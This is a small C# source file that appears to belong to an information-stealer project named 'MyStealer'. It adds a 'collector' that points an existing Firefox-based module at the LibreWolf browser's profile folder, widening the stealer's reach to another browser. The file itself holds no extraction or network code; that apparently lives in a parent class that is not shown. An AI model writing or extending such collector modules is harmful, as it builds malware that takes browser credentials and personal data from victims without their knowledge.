using System;
using System.IO;

namespace MyStealer.Collectors.Browser.FirefoxBased
{
    internal class LibreWolf : Firefox
    {
        public override string ApplicationName => "LibreWolf";

        protected override string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "librewolf", "Profiles");

        public override string[] LibDirectory => new string[] { "LibreWolf" };
    }
}
